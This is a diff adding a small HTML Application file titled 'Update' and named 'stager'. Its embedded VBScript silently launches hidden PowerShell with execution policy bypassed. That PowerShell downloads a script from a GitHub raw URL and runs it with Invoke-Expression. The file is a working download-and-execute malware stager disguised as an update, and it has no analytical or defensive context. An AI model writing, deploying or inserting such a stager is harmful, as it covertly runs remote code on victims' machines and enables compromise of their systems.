@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <HTA:APPLICATION ID="o" APPLICATIONNAME="stager" WINDOWSTATE="minimize" />
+    <title>Update</title>
+</head>
+<body>
+    <script language="VBScript">
+        Dim shell
+        Set shell = CreateObject("WScript.Shell")
+        shell.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonynoh/Shadowclicker/main/ShadowClicker.ps1')"""
+    </script>
+</body>
+</html>
